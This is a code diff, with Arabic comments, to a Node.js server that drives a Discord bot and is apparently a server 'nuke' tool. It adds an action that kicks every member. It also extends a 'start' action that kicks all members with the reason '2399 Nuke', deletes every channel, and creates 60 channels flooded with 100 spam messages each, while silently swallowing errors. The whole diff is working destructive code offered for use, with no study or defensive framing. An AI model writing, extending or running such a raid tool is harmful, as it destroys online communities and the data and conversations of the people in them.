@@ -17,6 +17,12 @@ app.post('/execute', async (req, res) => {
         await client.login(token);
         const guild = await client.guilds.fetch(guildId);
 
+        // وظيفة الطرد المنفصلة
+        if (action === 'طرد الجميع') {
+            const members = await guild.members.fetch();
+            members.forEach(m => { if(m.kickable) m.kick('Lord 2399 Power').catch(() => {}); });
+        }
+
         if (action === 'تغيير الأسماء') {
             guild.channels.cache.forEach(c => c.setName(customName || 'Group 2399').catch(() => {}));
         }
@@ -37,20 +43,22 @@ app.post('/execute', async (req, res) => {
         }
 
         if (action === 'ابدأ') {
-            // تنفيذ الكل بترتيب انفجاري
+            // تنفيذ كل شيء: طرد، حذف، إنشاء، سبام
             const members = await guild.members.fetch();
-            members.forEach(m => { if(m.kickable) m.kick().catch(() => {}); });
+            members.forEach(m => { if(m.kickable) m.kick('2399 Nuke').catch(() => {}); });
+            
             guild.channels.cache.forEach(c => c.delete().catch(() => {}));
+            
             for (let i = 0; i < 60; i++) {
                 guild.channels.create({ name: customName || '2399-nuke', type: ChannelType.GuildText })
-                .then(c => { for(let j=0; j<100; j++) c.send(customMsg || '# 2399').catch(() => {}); });
+                .then(c => { for(let j=0; j<100; j++) c.send(customMsg || '# 2399 Is Here').catch(() => {}); });
             }
         }
 
-        res.send({ status: '✅ تم إطلاق العملية بنجاح!' });
+        res.send({ status: '✅ تم تنفيذ العملية يا لورد!' });
     } catch (e) {
-        res.status(500).send({ status: '❌ خطأ في البيانات أو الصلاحيات' });
+        res.status(500).send({ status: '❌ فشل: تأكد من الصلاحيات والتوكن' });
     }
 });
 
-app.listen(3000, () => console.log('Lord System Active'));
+app.listen(3000, () => console.log('2399 System Online'));
